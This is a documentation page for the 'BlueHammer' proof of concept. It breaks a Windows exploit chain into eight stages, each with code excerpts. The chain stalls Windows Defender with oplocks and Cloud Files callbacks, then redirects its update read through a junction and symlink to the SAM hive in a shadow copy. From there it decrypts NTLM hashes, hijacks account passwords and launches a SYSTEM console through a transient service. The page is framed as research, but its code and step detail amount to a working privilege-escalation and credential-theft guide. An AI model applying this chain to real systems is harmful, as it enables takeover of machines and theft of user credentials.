@@ -1,0 +1,544 @@
+---
+title: 'Attack chain'
+description: 'Sequential technical breakdown of the full BlueHammer exploit chain as implemented in wmain().'
+---
+
+<Warning>
+  This document is a research reference for the BlueHammer proof-of-concept. It describes a Windows
+  privilege-escalation and credential-theft chain. Use only in authorised research environments.
+</Warning>
+
+BlueHammer chains eight distinct stages to read the live SAM hive from a VSS snapshot without
+administrator privileges and then use the extracted NTLM hashes to escalate to SYSTEM. Every
+stage is implemented sequentially in `wmain()` (lines 2881–3442 of `FunnyApp.cpp`).
+
+---
+
+## Stage overview
+
+| # | Stage | Core mechanism |
+|---|-------|----------------|
+| 1 | Update discovery | Windows Update Agent COM API |
+| 2 | Update download | WinInet + FDI cabinet extraction |
+| 3 | VSS preparation | EICAR trigger + batch oplock + shadow-copy polling |
+| 4 | WD freeze | Cloud Files sync root + `CF_CALLBACK_TYPE_FETCH_PLACEHOLDERS` |
+| 5 | Directory manipulation | `ServerMpUpdateEngineSignature` RPC + `ReadDirectoryChangesW` + batch oplock |
+| 6 | Junction + symlink injection | Mount-point reparse buffer + `NtCreateSymbolicLinkObject` |
+| 7 | SAM capture | Loop-open through the symlink; read into heap buffer |
+| 8 | Privilege escalation | SAM offline parse → NTLM hash → `SamiChangePasswordUser` → transient SYSTEM service |
+
+---
+
+<Steps>
+
+<Step title="Stage 1 — Update discovery">
+
+### What the code does
+
+`wmain()` enters a polling loop that calls `CheckForWDUpdates()` every 30 seconds until a Windows
+Defender signature-definition update is pending for the local machine.
+
+### Functions called
+
+`CheckForWDUpdates(wchar_t* updatetitle, bool* criterr)` — lines 785–985
+
+### Windows API / mechanism
+
+The Windows Update Agent (WUA) COM automation API:
+
+- `CoCreateInstance` with `Microsoft.Update.Session` ProgID → `IUpdateSession`
+- `IUpdateSession::CreateUpdateSearcher` → `IUpdateSearcher`
+- `IUpdateSearcher::Search(L"")` → `ISearchResult`
+- Iterates `IUpdateCollection`; for each update checks **both** category names
+  `"Microsoft Defender Antivirus"` and `"Definition Updates"` (case-insensitive).
+
+```cpp
+IsWdUdpate = _wcsicmp(catname, L"Microsoft Defender Antivirus") == 0;
+IsSigUpdate = _wcsicmp(catname, L"Definition Updates") == 0;
+updatesfound = IsWdUdpate && IsSigUpdate;
+```
+
+The update title is copied into the caller-supplied `updatetitle` buffer and printed.
+
+### Error paths
+
+| Condition | Behaviour |
+|-----------|-----------|
+| `CoInitialize` returns non-zero | Sets `*criterr = true`; `wmain` goes to `cleanup` |
+| Any `IUpdate*` COM call fails | Sets `*criterr = true`; releases COM objects and returns `false` |
+| No matching update found | Returns `false`; loop sleeps 30 s and retries |
+
+</Step>
+
+<Step title="Stage 2 — Update download">
+
+### What the code does
+
+`GetUpdateFiles()` downloads the MpSigStub update package (a self-extracting PE) from Microsoft's
+FWLink URL, walks the PE `.rsrc` section to locate the embedded cabinet file, and extracts the
+cabinet in-memory using custom FDI I/O callbacks. The result is a linked list of `UpdateFiles`
+nodes, each holding a filename and heap-allocated buffer for one extracted file.
+
+### Functions called
+
+- `GetUpdateFiles(int* filecount)` — lines 599–783
+- `GetCabFileFromBuff(PIMAGE_DOS_HEADER, ULONG, ULONG*)` — lines 465–596
+- FDI callbacks: `CUST_FNOPEN`, `CUST_FNREAD`, `CUST_FNWRITE`, `CUST_FNCLOSE`, `CUST_FNSEEK`, `CUST_FNFDINOTIFY`
+
+### Windows API / mechanism
+
+**Download:** WinInet
+
+```cpp
+hint  = InternetOpen(L"Chrome/141.0.0.0", INTERNET_OPEN_TYPE_DIRECT, ...);
+hint2 = InternetOpenUrl(hint,
+    L"https://go.microsoft.com/fwlink/?LinkID=121721&arch=x64",
+    NULL, NULL,
+    INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP |
+    INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS |
+    INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD, NULL);
+```
+
+The `Content-Length` header is read with `HttpQueryInfo` to allocate the receive buffer before
+calling `InternetReadFile`.
+
+**PE parsing:** Manual walk of the section table looking for the `.rsrc` section. Once found, the
+first `IMAGE_RESOURCE_DATA_ENTRY` that is not a subdirectory is treated as the cabinet blob.
+Pointer arithmetic converts the virtual address to a raw file offset.
+
+**Cabinet extraction:** The FDI API is initialised with a set of callbacks that operate entirely
+on heap buffers (global `cabbuff2` / `cabbuffsz`). `FDICopy` drives extraction; `CUST_FNFDINOTIFY`
+handles `fdintCOPY_FILE` events by allocating a new `CabOpArguments` node for each file (skipping
+`MpSigStub.exe`). The written data lands in heap buffers and is later transferred into the
+`UpdateFiles` linked list.
+
+### Error paths
+
+| Condition | Behaviour |
+|-----------|-----------|
+| `InternetOpen` / `InternetOpenUrl` fails | Prints error code; jumps to `cleanup`; returns `NULL` |
+| `HttpQueryInfo` fails | Prints error code; jumps to `cleanup` |
+| PE magic or section headers invalid | `GetCabFileFromBuff` returns `NULL`; caller prints and goes to `cleanup` |
+| `FDICreate` or `FDICopy` fails | Prints `erfstruct.erfOper`; jumps to `cleanup` |
+| Empty `CabOpArgs` after extraction | Prints message; returns `NULL` |
+
+</Step>
+
+<Step title="Stage 3 — VSS preparation">
+
+### What the code does
+
+`TriggerWDForVS()` orchestrates three concurrent operations:
+
+1. Spawns `ShadowCopyFinderThread` to watch `\Device` for a new `HarddiskVolumeShadowCopy*` device.
+2. Creates a temp directory and writes the EICAR test string to `%TEMP%\{UUID}\foo.exe` (opened
+   with `FILE_FLAG_DELETE_ON_CLOSE` so no signature persists after the handle is closed).
+3. Places a batch oplock on `%windir%\System32\RstrtMgr.dll`. Opening `foo.exe` for a second read
+   causes Windows Defender to scan it, which triggers VSS snapshot creation; that VSS creation
+   blocks on `RstrtMgr.dll` (which is under a batch oplock), stalling WD's VSS context long enough
+   for `ShadowCopyFinderThread` to detect the new device.
+
+After the oplock fires, `FreezeVSS` is started on a second thread to hold WD in a controlled
+stall through the Cloud Files mechanism (see Stage 4).
+
+### Functions called
+
+- `TriggerWDForVS(HANDLE hreleaseevent, wchar_t* fullvsspath)` — lines 1593–1754
+- `ShadowCopyFinderThread(void* fullvsspath)` — lines 1161–1342
+- `RetrieveCurrentVSSList(HANDLE, bool*, int*, DWORD*)` — lines 1028–1159
+- `FreezeVSS(void* arg)` — (started here, detailed in Stage 4)
+
+### Windows API / mechanism
+
+**EICAR write:** The EICAR test string is stored reversed in the binary to avoid triggering
+on-access scans at load time; `rev()` reverses it at runtime before `WriteFile`.
+
+```cpp
+char eicar[] = "*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)CC7)^P(45XZP\\4[PA@%P!O5X";
+rev(eicar);
+// ... CreateFile + WriteFile + second CreateFile to trigger WD scan
+```
+
+**Batch oplock on RstrtMgr.dll:**
+
+```cpp
+hlock = CreateFile(rstmgr, GENERIC_READ | SYNCHRONIZE, NULL, NULL,
+                   OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
+DeviceIoControl(hlock, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL,
+                NULL, NULL, NULL, &ovd);
+GetOverlappedResult(hlock, &ovd, &nwf, TRUE); // blocks until WD breaks oplock
+```
+
+**VSS polling:** `ShadowCopyFinderThread` opens `\Device` via `NtOpenDirectoryObject` (directory
+query access), calls `RetrieveCurrentVSSList` to snapshot the pre-existing set of
+`HarddiskVolumeShadowCopy*` objects, then polls `NtQueryDirectoryObject` in a tight loop until a
+new shadow copy name appears. Once found, it opens `{vsspath}\Windows` via `NtCreateFile`
+(retrying on `STATUS_NO_SUCH_DEVICE`) to confirm the snapshot is mounted, then writes the NT
+device path to `fullvsspath`.
+
+### Error paths
+
+| Condition | Behaviour |
+|-----------|-----------|
+| Thread creation fails | `retval = false`; jumps to `cleanup` |
+| `CreateDirectory` fails | `retval = false`; jumps to `cleanup` |
+| EICAR file create/write fails | `retval = false`; jumps to `cleanup` |
+| Oplock request returns non-`ERROR_IO_PENDING` | `retval = false`; jumps to `cleanup` |
+| `ShadowCopyFinderThread` exits with non-zero code | `retval = false`; jumps to `cleanup` |
+| `FreezeVSS` thread exits before signalling `hvssready` | `retval = false`; jumps to `cleanup` |
+
+</Step>
+
+<Step title="Stage 4 — WD freeze">
+
+### What the code does
+
+`FreezeVSS()` registers the directory containing `FunnyApp.exe` as a Cloud Files sync root, then
+connects with a `CF_CALLBACK_TYPE_FETCH_PLACEHOLDERS` callback. When WD subsequently queries the
+directory (triggered in Stage 5), the callback fires. At that point the code:
+
+1. Signals `hnotifywdaccess` so Stage 5 can proceed.
+2. Places a batch oplock on a UUID-named `.lock` file in the same directory.
+3. Signals `hnotifylockcreated` to allow the placeholder transfer response to proceed.
+4. Calls `CfExecute` to complete the placeholder delivery — **which holds WD's directory scan
+   thread open** until the oplock on the `.lock` file is broken.
+
+WD is effectively frozen in the middle of its signature-update scan while the directory
+manipulation in Stage 5–6 takes place. When `FreezeVSS` receives `hcleanupevent` it tears down
+the sync root.
+
+### Functions called
+
+- `FreezeVSS(void* arg)` — lines 1455–1590
+- `CfCallbackFetchPlaceHolders(CF_CALLBACK_INFO*, CF_CALLBACK_PARAMETERS*)` — lines 1370–1453
+- `GetWDPID()` — lines 1344–1368
+
+### Windows API / mechanism
+
+```cpp
+CfRegisterSyncRoot(syncroot, &cfreg, &syncpolicy, CF_REGISTER_FLAG_NONE);
+CfConnectSyncRoot(syncroot, callbackreg, &callbackctx,
+                  CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO |
+                  CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH,
+                  &cfkey);
+```
+
+`CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO` is used so the callback receives `CF_PROCESS_INFO`
+identifying the querying process. The callback checks `GetWDPID() == cpi->ProcessId` to confirm
+it is WD before taking the freeze path.
+
+```cpp
+// inside CfCallbackFetchPlaceHolders, WD path:
+SetEvent(ctx->hnotifywdaccess);          // unblocks Stage 5
+WaitForSingleObject(ctx->hnotifylockcreated, INFINITE); // wait for lock
+CfExecute(&cfopinfo, &cfopparams);       // transfer one placeholder; holds WD
+```
+
+The `.lock` file batch oplock in `FreezeVSS`:
+
+```cpp
+DeviceIoControl(hlock, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL,
+                NULL, NULL, NULL, &ovd);
+SetEvent(callbackctx.hnotifylockcreated);  // let CfExecute proceed
+GetOverlappedResult(hlock, &ovd, &nwf, TRUE); // blocks until lock broken
+SetEvent(args->hvssready);                 // signal: WD frozen, safe to proceed
+```
+
+### Error paths
+
+| Condition | Behaviour |
+|-----------|-----------|
+| `CfRegisterSyncRoot` fails | Jumps to `cleanup`; sync root not registered flag ensures no unregister attempt |
+| `CfConnectSyncRoot` fails | Jumps to `cleanup` |
+| Event creation fails | Jumps to `cleanup` |
+| Lock file creation fails | Jumps to `cleanup` |
+| Oplock request returns non-`ERROR_IO_PENDING` | Jumps to `cleanup` |
+
+</Step>
+
+<Step title="Stage 5 — Directory manipulation">
+
+### What the code does
+
+`wmain` writes all cabinet-extracted update files into `%TEMP%\{UUID}` (the "update directory"),
+then opens `C:\ProgramData\Microsoft\Windows Defender\Definition Updates` with
+`FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED` for `ReadDirectoryChangesW`.
+
+A background `WDCallerThread` issues the `ServerMpUpdateEngineSignature` RPC call pointing at the
+update directory. WD accepts the directory path, creates a new subdirectory under Definition
+Updates, and queries the PoC's Cloud Files sync root — which fires the Stage 4 freeze callback,
+unblocking the main thread.
+
+The main thread detects the new subdirectory name via `ReadDirectoryChangesW`, then:
+
+1. Opens `%TEMP%\{UUID}\mpasbase.vdm` with `DELETE | FILE_DELETE_ON_CLOSE`.
+2. Immediately places a batch oplock on it and waits.
+
+When WD opens `mpasbase.vdm` in its own update directory (which it created), it breaks the
+oplock, delivering control back to the main thread with a race window.
+
+### Functions called
+
+- `WDCallerThread` / `CallWD` — lines 265–299
+- `RaiseExceptionInThread` — lines 251–263 (used to abort if RPC fails)
+
+### Windows API / mechanism
+
+**RPC call:**
+
+```cpp
+RpcStringBindingComposeW(MS_WD_UUID,
+    (RPC_WSTR)L"ncalrpc", NULL,
+    (RPC_WSTR)L"IMpService77BDAF73-B396-481F-9042-AD358843EC24",
+    NULL, &StringBinding);
+RpcBindingFromStringBindingW(StringBinding, &bindhandle);
+Proc42_ServerMpUpdateEngineSignature(bindhandle, NULL, args->dirpath, &errstat);
+```
+
+**Directory monitoring:**
+
+```cpp
+ReadDirectoryChangesW(hdir, buff, sizeof(buff), TRUE,
+                      FILE_NOTIFY_CHANGE_DIR_NAME,
+                      &retbytes, &od, NULL);
+// waits for either the directory change or the RPC thread completing
+WaitForMultipleObjects(2, events, FALSE, INFINITE);
+```
+
+**Oplock on `mpasbase.vdm`:**
+
+```cpp
+ntstat = NtCreateFile(&hupdatefile, GENERIC_READ | DELETE | SYNCHRONIZE,
+                      &objattr, &iostat, NULL, FILE_ATTRIBUTE_NORMAL,
+                      NULL, FILE_OPEN,
+                      FILE_NON_DIRECTORY_FILE | FILE_DELETE_ON_CLOSE, ...);
+DeviceIoControl(hupdatefile, FSCTL_REQUEST_BATCH_OPLOCK, ...);
+GetOverlappedResult(hupdatefile, &ovd, &transfersz, TRUE); // blocks
+```
+
+<Note>
+  The source comments: `"PoC might fail here with 0x8050A003 from time to time, this means the
+  update that the PoC is attempting to perform isn't the right one for this code"`. `0x8050A003`
+  is `MPCLIENT_E_BAD_SIGNATURE_FILE` — WD rejected the supplied update package. The loop back in
+  Stage 1 waits for a different pending update.
+</Note>
+
+### Error paths
+
+| Condition | Behaviour |
+|-----------|-----------|
+| `CreateDirectory` for update path fails | Jumps to `cleanup` |
+| `CreateFile` / `WriteFile` for any update file fails | Jumps to `cleanup` |
+| `ReadDirectoryChangesW` event beaten by RPC thread event | Prints RPC status; jumps to `cleanup` |
+| `NtCreateFile` on `mpasbase.vdm` fails | Prints NTSTATUS; jumps to `cleanup` |
+| Oplock request returns non-`ERROR_IO_PENDING` | Jumps to `cleanup` |
+
+</Step>
+
+<Step title="Stage 6 — Junction and symlink injection">
+
+### What the code does
+
+With the oplock fired (meaning WD has opened `mpasbase.vdm` and is waiting for the oplock to be
+released), the main thread performs a four-step directory substitution:
+
+1. **Rename `mpasbase.vdm` away** — uses `SetFileInformationByHandle` with `FileRenameInfo` to
+   move `%TEMP%\{UUID}\mpasbase.vdm` to `%TEMP%\{UUID}.WDFOO`. This is possible because the
+   oplock handle has the `DELETE` access right.
+2. **Rename the update directory** — `MoveFile(updatepath, newtmp)` renames `%TEMP%\{UUID}` to
+   `%TEMP%\{UUID}.foo`.
+3. **Recreate the directory as a reparse point** — `NtCreateFile` with
+   `FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT | FILE_DELETE_ON_CLOSE` re-creates
+   `%TEMP%\{UUID}` at the same path, then `FSCTL_SET_REPARSE_POINT` installs a
+   `IO_REPARSE_TAG_MOUNT_POINT` (junction) pointing to `\BaseNamedObjects\Restricted`.
+4. **Create an object-manager symlink** — `NtCreateSymbolicLinkObject` creates
+   `\BaseNamedObjects\Restricted\mpasbase.vdm` → `\Device\HarddiskVolumeShadowCopy{N}\Windows\System32\Config\SAM`.
+
+The oplock handle is then closed, releasing WD. WD resumes reading what it believes is its own
+update file `{DefUpdateDir}\mpasbase.vdm`, but path resolution now traverses:
+
+```
+{DefUpdateDir}\mpasbase.vdm
+  → junction → \BaseNamedObjects\Restricted
+  → NT symlink \BaseNamedObjects\Restricted\mpasbase.vdm
+  → \Device\HarddiskVolumeShadowCopy{N}\Windows\System32\Config\SAM
+```
+
+### Windows API / mechanism
+
+**File rename through oplock handle:**
+
+```cpp
+fri->ReplaceIfExists = TRUE;
+fri->FileNameLength  = wcslen(newname) * sizeof(wchar_t);
+wcscpy(&fri->FileName[0], newname);           // %TEMP%\{UUID}.WDFOO
+SetFileInformationByHandle(hupdatefile, FileRenameInfo, fri, renstructsz);
+```
+
+**Junction creation:**
+
+```cpp
+rdb->ReparseTag    = IO_REPARSE_TAG_MOUNT_POINT;
+// SubstituteName = L"\BaseNamedObjects\Restricted"
+DeviceIoControl(hreparsedir, FSCTL_SET_REPARSE_POINT, rdb, totalsz, ...);
+```
+
+**Object-manager symlink:**
+
+```cpp
+RtlInitUnicodeString(&objlinkname,
+    L"\\BaseNamedObjects\\Restricted\\mpasbase.vdm");
+RtlInitUnicodeString(&objlinktarget,
+    L"\\Device\\HarddiskVolumeShadowCopy{N}\\Windows\\System32\\Config\\SAM");
+_NtCreateSymbolicLinkObject(&hobjlink, GENERIC_ALL, &objattr, &objlinktarget);
+```
+
+### Error paths
+
+| Condition | Behaviour |
+|-----------|-----------|
+| `SetFileInformationByHandle` (rename) fails | Prints source/dest paths and error; jumps to `cleanup` |
+| `MoveFile` (rename directory) fails | Prints error; jumps to `cleanup` |
+| `NtCreateFile` (recreate as junction) fails | Prints NTSTATUS; jumps to `cleanup` |
+| `FSCTL_SET_REPARSE_POINT` fails | Prints error; jumps to `cleanup` |
+| `NtCreateSymbolicLinkObject` fails | Prints error; jumps to `cleanup` |
+
+</Step>
+
+<Step title="Stage 7 — SAM capture">
+
+### What the code does
+
+The main thread polls `CreateFile` on `{newDefUpdateDir}\mpasbase.vdm` in a tight loop until the
+handle is valid — at which point WD has already opened and read the file (SAM) through the
+junction/symlink chain. The PoC then reads the entire SAM hive into a heap buffer, writes it to
+`%TEMP%\{UUID}`, and signals `hreleaseready` to let `FreezeVSS` clean up.
+
+### Windows API / mechanism
+
+```cpp
+// Tight loop until WD has opened the path through the symlink
+do {
+    hleakedfile = CreateFile(newdefupdatedirname,
+                             GENERIC_READ, FILE_SHARE_READ,
+                             NULL, OPEN_EXISTING,
+                             FILE_ATTRIBUTE_NORMAL, NULL);
+} while (hleakedfile == INVALID_HANDLE_VALUE || !hleakedfile);
+
+GetFileSizeEx(hleakedfile, &_filesz);
+LockFileEx(hleakedfile, LOCKFILE_EXCLUSIVE_LOCK, NULL,
+           _filesz.LowPart, _filesz.HighPart, &ovd2);
+ReadFile(hleakedfile, leakedfilebuff, _filesz.QuadPart, &__readsz, NULL);
+UnlockFile(hleakedfile, ...);
+```
+
+The captured buffer is written to `%TEMP%\{UUID}` (a UUID filename, no extension). The path is
+passed directly to `DoSpawnShellAsAllUsers`.
+
+### Error paths
+
+| Condition | Behaviour |
+|-----------|-----------|
+| Heap allocation for buffer fails | Jumps to `cleanup` |
+| `ReadFile` fails | Jumps to `cleanup` |
+| `CreateFile` (output file) fails | Jumps to `cleanup` |
+| `WriteFile` (output file) fails | Deletes partial output; jumps to `cleanup` |
+
+</Step>
+
+<Step title="Stage 8 — Privilege escalation">
+
+### What the code does
+
+`DoSpawnShellAsAllUsers(wchar_t* sampath)` opens the captured SAM hive offline, decrypts every
+NTLM hash, and for each non-current, non-WDAGUtilityAccount user:
+
+1. **Temporarily changes the account password** using the original hash via `SamiChangePasswordUser`.
+2. **Logs on interactively** with `LogonUserEx`.
+3. **Checks for admin elevation** via `GetTokenInformation(TokenLinkedToken)` →
+   `CheckTokenMembership(WinBuiltinAdministratorsSid)`.
+4. If admin: impersonates a batch logon token with medium integrity, opens the SCM with
+   `SC_MANAGER_CREATE_SERVICE`, creates a transient demand-start service running
+   `FunnyApp.exe {sessionId}` as SYSTEM (`SERVICE_WIN32_OWN_PROCESS`), starts it immediately,
+   then deletes the service.
+5. **Spawns a user shell** with `CreateProcessWithLogonW` (`conhost.exe`).
+6. **Restores the original password** by calling `ChangeUserPassword` with the original NTLM hash.
+
+The transient service runs `FunnyApp.exe` with the caller's session ID as the sole argument. The
+SYSTEM instance detects `IsRunningAsLocalSystem()` is true, extracts the session ID from `argv[1]`,
+and calls `LaunchConsoleInSessionId` — which duplicates its own SYSTEM token, assigns the target
+session, and spawns `conhost.exe` via `CreateProcessAsUser`.
+
+### Functions called
+
+- `DoSpawnShellAsAllUsers(wchar_t* sampath)` — lines 2481–2823
+- `GetLSASecretKey(unsigned char bootkeybytes[16])` — lines 1785–1829
+- `UnprotectPasswordEncryptionKey` / `UnprotectNTHash` — (credential decryption chain)
+- `CalculateNTLMHash(char* _input)` — MD4/NTLM computation
+- `ChangeUserPassword(wchar_t*, void*, char*, char*)` — SAM password change via `samlib.dll`
+- `IsRunningAsLocalSystem()` — SID check
+- `LaunchConsoleInSessionId(DWORD sessionid)` — SYSTEM console spawn
+
+### Windows API / mechanism
+
+**Offline hive access:** `OROpenHive` (offline registry library `offreg.dll`) opens the captured
+SAM file without mounting it into the live registry. `OROpenKey` / `ORGetValue` read
+`SAM\Domains\Account\F` (domain key) and `SAM\Domains\Account\Users\{RID}\V` (per-user data).
+
+**LSA boot key:** Read from `SYSTEM\CurrentControlSet\Control\Lsa\{JD,Skew1,GBG,Data}` class
+names, hex-decoded, and permuted by a fixed index table:
+
+```cpp
+int indices[] = { 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 };
+```
+
+**NTLM hash decryption:** Two-layer decryption:
+- Outer: AES-128-CBC using the LSA key (via `CryptDecrypt` with `CALG_AES_128`)
+- Inner: Two parallel DES-ECB blocks keyed from the user's RID bytes (via `CryptDecrypt` with `CALG_DES`)
+
+**Password change (SAM):**
+
+```cpp
+_SamiChangePasswordUser(huser,
+    false, (BYTE*)oldLm, (BYTE*)newLm,
+    true,  (BYTE*)oldNTLM, (BYTE*)newNTLM);
+```
+
+**Transient SYSTEM service:**
+
+```cpp
+wsprintf(servicecmd, L"\"%s\" %d", binpath, currentsesid);
+SC_HANDLE hsvc = CreateService(hmgr, wuid2, wuid2, GENERIC_ALL,
+    SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START,
+    SERVICE_ERROR_IGNORE, servicecmd, ...);
+StartService(hsvc, NULL, NULL);
+Sleep(100);
+DeleteService(hsvc);
+```
+
+**SYSTEM console in user session:**
+
+```cpp
+// Inside LaunchConsoleInSessionId (running as SYSTEM service):
+DuplicateTokenEx(htoken, TOKEN_ALL_ACCESS, ..., TokenPrimary, &hnewtoken);
+SetTokenInformation(hnewtoken, TokenSessionId, &sessionid, sizeof(DWORD));
+CreateProcessAsUser(hnewtoken, L"C:\\Windows\\System32\\conhost.exe", ...);
+```
+
+### Error paths
+
+| Condition | Behaviour |
+|-----------|-----------|
+| `OROpenHive` fails | Prints error; returns `false` |
+| `GetLSASecretKey` fails | Prints error; returns `false` |
+| `ChangeUserPassword` fails | Prints error; continues to next user |
+| `LogonUserEx` fails | Prints error; continues |
+| `OpenSCManager` fails | Prints error; system shell not launched |
+| `CreateService` fails | Prints error; does not call `StartService` |
+| Hash is NULL / zero-length | Skips the user (`Skip: NULL NTLM`) |
+| User is `WDAGUtilityAccount` | Skipped unconditionally |
+| User matches current process owner | Skipped unconditionally |
+
+</Step>
+
+</Steps>
